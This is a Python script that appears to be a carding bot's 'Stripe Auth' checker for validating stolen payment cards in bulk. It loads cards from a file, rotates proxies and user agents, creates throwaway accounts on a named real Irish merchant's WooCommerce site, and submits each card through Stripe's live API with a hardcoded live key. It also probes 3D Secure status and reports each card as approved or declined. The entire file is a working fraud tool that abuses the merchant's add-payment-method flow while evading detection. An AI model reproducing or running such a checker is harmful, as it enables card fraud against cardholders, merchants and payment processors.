import requests
import os
import re
import random
import string
import time
import json
import uuid
from user_agent import generate_user_agent
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

stripe_headers = {
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.6',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="142", "Brave";v="142", "Not_A Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'sec-gpc': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36',
}

def get_rotating_user_agent():
    agents = [
        generate_user_agent(device_type='desktop'),
        generate_user_agent(device_type='desktop', os=('mac', 'linux')),
        generate_user_agent(device_type='desktop', os=('win',)),
        generate_user_agent(navigator='chrome'),
        generate_user_agent(navigator='firefox'),
    ]
    return random.choice(agents)

def generate_random_email():
    timestamp = int(time.time() * 1000)
    random_part = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    unique_id = str(uuid.uuid4())[:8]
    return f'{random_part}_{unique_id}_{timestamp}@gmail.com'

def parse_proxy(proxy_str):
    try:
        proxy_str = proxy_str.strip()
        
        if '@' in proxy_str:
            auth_part, server_part = proxy_str.split('@', 1)
            username, password = auth_part.split(':', 1)
            ip, port = server_part.split(':', 1)
        else:
            parts = proxy_str.split(':')
            if len(parts) == 4:
                ip, port, username, password = parts
            elif len(parts) == 2:
                ip, port = parts
                username, password = None, None
            else:
                ip, port = parts[0], parts[1]
                username, password = None, None
        
        if username and password:
            proxy_url = f'http://{username}:{password}@{ip}:{port}'
        else:
            proxy_url = f'http://{ip}:{port}'
        
        return {'http': proxy_url, 'https': proxy_url}
    except:
        return None

def load_proxies():
    if os.path.exists('proxy.txt'):
        with open('proxy.txt', 'r') as f:
            proxies = [line.strip() for line in f if line.strip()]
        return proxies
    return []

def load_cards():
    if os.path.exists('cards.txt'):
        with open('cards.txt', 'r') as f:
            cards = [line.strip() for line in f if line.strip()]
        return cards
    return []

def get_bin_info(bin_number):
    if not bin_number or len(bin_number) < 6:
        return {
            'bank': 'Unavailable',
            'country': 'Unknown',
            'brand': 'Unknown',
            'type': 'Unknown',
            'level': 'Unknown',
            'emoji': ''
        }
    
    bin_code = bin_number[:6]
    apis_to_try = [
        f"https://lookup.binlist.net/{bin_code}",
        f"https://bins.antipublic.cc/bins/{bin_code}",
    ]
    
    headers = {
        'Accept': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
    }
    
    for api_url in apis_to_try:
        try:
            response = requests.get(api_url, headers=headers, timeout=10, verify=False)
            if response.status_code == 200:
                data = response.json()
                bin_info = {}
                
                if 'binlist.net' in api_url:
                    bin_info = {
                        'bank': data.get('bank', {}).get('name', 'Unavailable'),
                        'country': data.get('country', {}).get('name', 'Unknown'),
                        'brand': data.get('scheme', 'Unknown'),
                        'type': data.get('type', 'Unknown'),
                        'level': data.get('brand', 'Unknown'),
                        'emoji': get_country_emoji(data.get('country', {}).get('alpha2', ''))
                    }
                elif 'antipublic.cc' in api_url:
                    bin_info = {
                        'bank': data.get('bank', 'Unavailable'),
                        'country': data.get('country', 'Unknown'),
                        'brand': data.get('vendor', 'Unknown'),
                        'type': data.get('type', 'Unknown'),
                        'level': data.get('level', 'Unknown'),
                        'emoji': get_country_emoji(data.get('country_code', ''))
                    }
                
                for key in ['bank', 'country', 'brand', 'type', 'level']:
                    if not bin_info.get(key) or bin_info[key] in ['', 'N/A', 'None', 'null']:
                        bin_info[key] = 'Unknown'
                
                if bin_info['bank'] not in ['Unavailable', 'Unknown'] or bin_info['brand'] != 'Unknown':
                    return bin_info
                    
        except:
            continue
    
    return {
        'bank': 'Unavailable',
        'country': 'Unknown',
        'brand': 'Unknown',
        'type': 'Unknown',
        'level': 'Unknown',
        'emoji': ''
    }

def get_country_emoji(country_code):
    if not country_code or len(country_code) != 2:
        return ''
    try:
        country_code = country_code.upper()
        return ''.join(chr(127397 + ord(char)) for char in country_code)
    except:
        return ''

def create_new_account(session, proxy_str):
    try:
        proxies = parse_proxy(proxy_str) if proxy_str else None
        
        login_page_res = session.get(
            'https://butcher.ie/my-account/', 
            proxies=proxies, 
            timeout=30,
            verify=False
        )
        login_nonce_match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', login_page_res.text)
        if not login_nonce_match:
            return False, "Failed to get login nonce"
        login_nonce = login_nonce_match.group(1)

        random_email = generate_random_email()
        register_data = {
            'email': random_email, 
            'woocommerce-register-nonce': login_nonce,
            '_wp_http_referer': '/my-account/', 
            'register': 'Register',
        }
        
        reg_response = session.post(
            'https://butcher.ie/my-account/', 
            data=register_data, 
            proxies=proxies, 
            timeout=30, 
            allow_redirects=False,
            verify=False
        )
        if reg_response.status_code in [302, 303]:
            return True, "Account created"
        else:
            return True, "Account might be created"
            
    except Exception as e:
        return False, f"Account error: {str(e)}"

def get_payment_nonce(session, proxy_str):
    try:
        proxies = parse_proxy(proxy_str) if proxy_str else None
        
        payment_page_res = session.get(
            'https://butcher.ie/my-account/add-payment-method/', 
            proxies=proxies, 
            timeout=30,
            verify=False
        )
        payment_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', payment_page_res.text)
        if not payment_nonce_match:
            return None, "Failed to get payment nonce"
        
        ajax_nonce = payment_nonce_match.group(1)
        return ajax_nonce, "Success"
    except Exception as e:
        return None, f"Payment nonce error: {str(e)}"

def get_3ds_challenge_mandated(website_response, proxy_str):
    max_retries = 2
    for attempt in range(max_retries):
        try:
            if not website_response.get('success'):
                return 'ACS_EXTRACTION_FAILED'
                
            data_section = website_response.get('data', {})
            if data_section.get('status') != 'requires_action':
                return 'ACS_EXTRACTION_FAILED'
                
            next_action = data_section.get('next_action', {})
            if next_action.get('type') == 'use_stripe_sdk':
                use_stripe_sdk = next_action.get('use_stripe_sdk', {})
                three_d_secure_2_source = use_stripe_sdk.get('three_d_secure_2_source')
                
                if three_d_secure_2_source:
                    time.sleep(0.5)
                    proxies = parse_proxy(proxy_str) if proxy_str else None
                    headers = stripe_headers.copy()
                    headers['user-agent'] = get_rotating_user_agent()
                    
                    auth_data = {
                        'source': three_d_secure_2_source,
                        'browser': '{"fingerprintAttempted":false,"fingerprintData":null,"challengeWindowSize":null,"threeDSCompInd":"Y","browserJavaEnabled":false,"browserJavascriptEnabled":true,"browserLanguage":"en-GB","browserColorDepth":"24","browserScreenHeight":"864","browserScreenWidth":"1536","browserTZ":"-330","browserUserAgent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"}',
                        'one_click_authn_device_support[hosted]': 'false',
                        'one_click_authn_device_support[same_origin_frame]': 'false',
                        'one_click_authn_device_support[spc_eligible]': 'true',
                        'one_click_authn_device_support[webauthn_eligible]': 'true',
                        'one_click_authn_device_support[publickey_credentials_get_allowed]': 'true',
                        'key': 'pk_live_51IbQ21ItrjNAxRL74KVowqSSvUFQsbInpdW3Nu9IJuNQ00B4cMJGlul12HjkQojXk3L5vvtbvrD4kfEYDvAfu3Nv00NOJyIwrd',
                        '_stripe_version': '2024-06-20'
                    }
                    
                    auth_response = requests.post(
                        'https://api.stripe.com/v1/3ds2/authenticate',
                        headers=headers,
                        data=auth_data,
                        proxies=proxies,
                        timeout=20,
                        verify=False
                    )
                    
                    if auth_response.status_code == 200:
                        auth_data_response = auth_response.json()
                        ares = auth_data_response.get('ares', {})
                        acs_challenge = ares.get('acsChallengeMandated', 'ACS_EXTRACTION_FAILED')
                        
                        if acs_challenge in ['Y', 'N']:
                            return acs_challenge
                        else:
                            return 'ACS_EXTRACTION_FAILED'
            
            return 'ACS_EXTRACTION_FAILED'
            
        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.HTTPError):
            if attempt < max_retries - 1:
                time.sleep(1)
                continue
            else:
                return 'ACS_EXTRACTION_FAILED'
        except:
            return 'ACS_EXTRACTION_FAILED'
    
    return 'ACS_EXTRACTION_FAILED'

def extract_error_from_response(response_text):
    try:
        if response_text.strip():
            try:
                data = json.loads(response_text)
                if isinstance(data, dict):
                    if 'error' in data:
                        error_msg = data['error'].get('message', '')
                        if error_msg:
                            return error_msg
                    
                    if 'data' in data and 'error' in data['data']:
                        error_msg = data['data']['error'].get('message', '')
                        if error_msg:
                            return error_msg
                    
                    if 'message' in data:
                        return data['message']
            except:
                pass
        
        patterns = [
            r'"message"\s*:\s*"([^"]+)"',
            r'"error"\s*:\s*{[^}]*"message"\s*:\s*"([^"]+)"',
            r'error\s*:\s*"([^"]+)"',
            r'decline[^"]*"([^"]+)"',
            r'declined[^"]*"([^"]+)"',
            r'incorrect[^"]*"([^"]+)"',
            r'invalid[^"]*"([^"]+)"',
            r'expired[^"]*"([^"]+)"',
            r'cvc[^"]*"([^"]+)"',
            r'security[^"]*"([^"]+)"',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                error_msg = match.group(1)
                error_msg = error_msg.replace('\\"', '"').replace('\\/', '/')
                return error_msg
        
        response_lower = response_text.lower()
        error_indicators = [
            ('declined', 'Your card was declined.'),
            ('insufficient', 'Your card has insufficient funds.'),
            ('expired', 'Your card has expired.'),
            ('invalid', 'Your card number is invalid.'),
            ('cvc', 'Your card\'s security code is incorrect.'),
            ('security', 'Your card\'s security code is incorrect.'),
            ('incorrect_cvc', 'Your card\'s security code is incorrect.'),
            ('do_not_honor', 'Your card was declined.'),
            ('pickup_card', 'Your card has been reported lost or stolen.'),
            ('restricted_card', 'Your card is restricted.'),
            ('card_not_supported', 'Your card is not supported.'),
            ('generic_decline', 'Your card was declined.'),
            ('transaction_not_allowed', 'Transaction not allowed.'),
        ]
        
        for indicator, message in error_indicators:
            if indicator in response_lower:
                return message
        
        return "Card declined."
        
    except:
        return "Card declined."

def get_final_message(website_response, proxy_str, raw_response_text=""):
    try:
        if not isinstance(website_response, dict):
            if raw_response_text:
                return extract_error_from_response(raw_response_text)
            return "Card declined."
            
        if website_response.get('success'):
            data_section = website_response.get('data', {})
            status = data_section.get('status', '')
            
            if status == 'succeeded':
                return "Payment method successfully added."
            elif status == 'requires_action':
                acs_challenge_mandated = get_3ds_challenge_mandated(website_response, proxy_str)
                
                error_message = ""
                if 'error' in data_section:
                    error_msg = data_section['error'].get('message', '')
                    if 'unable to authenticate your payment method' in error_msg.lower():
                        error_message = " | Auth Failed: Unable to authenticate payment method"
                
                if acs_challenge_mandated == 'Y':
                    return f"3D Secure verification required. | ACS Challenge: ✅ Y{error_message}"
                elif acs_challenge_mandated == 'N':
                    return f"3D Secure verification required. | ACS Challenge: ❌ N{error_message}"
                else:
                    return f"3D Secure verification required. | ACS Challenge: {acs_challenge_mandated}{error_message}"
            else:
                return "Payment method status unknown."
        else:
            error_data = website_response.get('data', {})
            if 'error' in error_data:
                error_msg = error_data['error'].get('message', '')
                if error_msg:
                    error_lower = error_msg.lower()
                    
                    if 'cvc' in error_lower or 'security code' in error_lower:
                        return "Your card's security code is incorrect."
                    elif 'declined' in error_lower:
                        return "Your card was declined."
                    elif 'insufficient' in error_lower:
                        return "Your card has insufficient funds."
                    elif 'expired' in error_lower:
                        return "Your card has expired."
                    elif 'unable to authenticate your payment method' in error_lower:
                        return "We are unable to authenticate your payment method. Please choose a different payment method and try again."
                    elif 'incorrect' in error_lower:
                        return "Your card number is incorrect."
                    elif 'invalid' in error_lower:
                        return "Your card number is invalid."
                    elif 'do_not_honor' in error_lower:
                        return "Your card was declined by the bank."
                    elif 'pickup_card' in error_lower:
                        return "Your card has been reported lost or stolen."
                    elif 'restricted_card' in error_lower:
                        return "Your card is restricted."
                    elif 'card_not_supported' in error_lower:
                        return "Your card is not supported."
                    elif 'transaction_not_allowed' in error_lower:
                        return "Transaction not allowed with this card."
                    else:
                        return error_msg
            
            if raw_response_text:
                return extract_error_from_response(raw_response_text)
                
            return "Card declined."
    except:
        return "Card declined."

def check_card_stripe(cc_line):
    start_time = time.time()
    max_retries = 2
    
    for attempt in range(max_retries):
        try:
            n, mm, yy, cvc = cc_line.strip().split('|')
            if not yy.startswith('20'):
                yy = '20' + yy
            
            bin_info = get_bin_info(n[:6])
            
            session = requests.Session()
            session.headers.update({'user-agent': get_rotating_user_agent()})

            if len(yy) == 4:
                yy_stripe = yy[-2:]
            else:
                yy_stripe = yy

            proxies_list = load_proxies()
            if not proxies_list:
                proxy_str = None
            else:
                proxy_str = random.choice(proxies_list)
            
            account_created, account_msg = create_new_account(session, proxy_str)
            if not account_created:
                elapsed_time = time.time() - start_time
                return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Account creation failed
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

            ajax_nonce, nonce_msg = get_payment_nonce(session, proxy_str)
            if not ajax_nonce:
                elapsed_time = time.time() - start_time
                return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Payment nonce failed
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

            data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_stripe}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=ZW&pasted_fields=number&payment_user_agent=stripe.js%2Fbe0b733d77%3B+stripe-js-v3%2Fbe0b733d77%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fbutcher.ie&time_on_page=26950&client_attribution_metadata[client_session_id]=4714fe23-ead1-45e1-a53b-5fb446193d91&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=a79f1c2a-2265-4119-96d1-e41484003164&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=6c06b45f-43e8-4cb5-b0ca-88cf5a6f43e4ee60b4&muid=7aba0b09-cb60-4583-a647-45520202b270879daf&sid=6196b5ca-ef2e-4308-b139-7606ea33080483c952&key=pk_live_51IbQ21ItrjNAxRL74KVowqSSvUFQsbInpdW3Nu9IJuNQ00B4cMJGlul12HjkQojXk3L5vvtbvrD4kfEYDvAfu3Nv00NOJyIwrd&_stripe_version=2024-06-20'

            proxies = parse_proxy(proxy_str) if proxy_str else None
            response = requests.post(
                'https://api.stripe.com/v1/payment_methods', 
                headers=stripe_headers, 
                data=data, 
                proxies=proxies, 
                timeout=20,
                verify=False
            )
            response_data = response.json()
            
            if 'id' in response_data:
                pm_id = response_data['id']
                
                headers2 = {
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.6',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'origin': 'https://butcher.ie',
                    'priority': 'u=1, i',
                    'referer': 'https://butcher.ie/my-account/add-payment-method/',
                    'sec-ch-ua': '"Chromium";v="142", "Brave";v="142", "Not_A Brand";v="99"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'same-origin',
                    'sec-gpc': '1',
                    'user-agent': get_rotating_user_agent(),
                    'x-requested-with': 'XMLHttpRequest',
                }

                data2 = {
                    'action': 'wc_stripe_create_and_confirm_setup_intent',
                    'wc-stripe-payment-method': pm_id,
                    'wc-stripe-payment-type': 'card',
                    '_ajax_nonce': ajax_nonce,
                }

                response2 = session.post(
                    'https://butcher.ie/wp-admin/admin-ajax.php', 
                    headers=headers2, 
                    data=data2, 
                    proxies=proxies, 
                    timeout=20,
                    verify=False
                )
                raw_response_text = response2.text
                
                website_response = {}
                try:
                    if raw_response_text.strip():
                        website_response = response2.json()
                        
                        if isinstance(website_response, (int, float)):
                            website_response = {
                                'success': bool(website_response),
                                'data': {'error': {'message': extract_error_from_response(raw_response_text)}}
                            }
                except:
                    error_msg = extract_error_from_response(raw_response_text)
                    website_response = {
                        'success': False,
                        'data': {'error': {'message': error_msg}}
                    }
                
                final_message = get_final_message(website_response, proxy_str, raw_response_text)
                elapsed_time = time.time() - start_time

                if isinstance(website_response, dict) and website_response.get('success'):
                    data_section = website_response.get('data', {})
                    status = data_section.get('status', '')
                    
                    if status == 'succeeded':
                        return f"""
APPROVED CC ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                    elif status == 'requires_action':
                        return f"""
APPROVED CC ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                    else:
                        return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                else:
                    error_data = website_response.get('data', {}) if isinstance(website_response, dict) else {}
                    error_msg = error_data.get('error', {}).get('message', '').lower() if 'error' in error_data else ''
                    
                    if any(term in error_msg for term in ['cvc', 'security code', 'incorrect_cvc']):
                        return f"""
APPROVED CCN ✅

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
                    
                    return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {final_message}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
            else:
                elapsed_time = time.time() - start_time
                bin_info = get_bin_info(n[:6])
                return f"""
DECLINED CC ❌

💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Stripe validation failed
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

📚𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {bin_info['brand']} - {bin_info['type']} - {bin_info['level']}
🏛️𝗕𝗮𝗻𝗸: {bin_info['bank']}
🌎𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {bin_info['country']} {bin_info['emoji']}
🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.HTTPError):
            if attempt < max_retries - 1:
                time.sleep(1)
                continue
            else:
                elapsed_time = time.time() - start_time
                return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Network error after {max_retries} retries
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
        except Exception as e:
            elapsed_time = time.time() - start_time
            return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ {str(e)}
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""
    
    # This return statement is outside the for loop
    elapsed_time = time.time() - start_time
    return f"""
ERROR ❌

💳𝗖𝗖 ⇾ {cc_line}
🚀𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ⇾ Max retries exceeded
💰𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ Stripe Auth  - 1

🕒𝗧𝗼𝗼𝗸 {elapsed_time:.2f} 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 [ 0 ]

🔱𝗕𝗼𝘁 𝗯𝘆 :『@mhitzxg 帝 @pr0xy_xd』
"""

def check_cards_stripe(cc_lines):
    """Mass check function for multiple cards"""
    results = []
    for cc_line in cc_lines:
        result = check_card_stripe(cc_line)
        results.append(result)
        time.sleep(2)  # Delay between checks
    return results


if __name__ == "__main__":
    test_cc = "4111111111111111|12|2025|123"
    print("Testing Stripe checker...")
    result = check_card_stripe(test_cc)
    print(result)
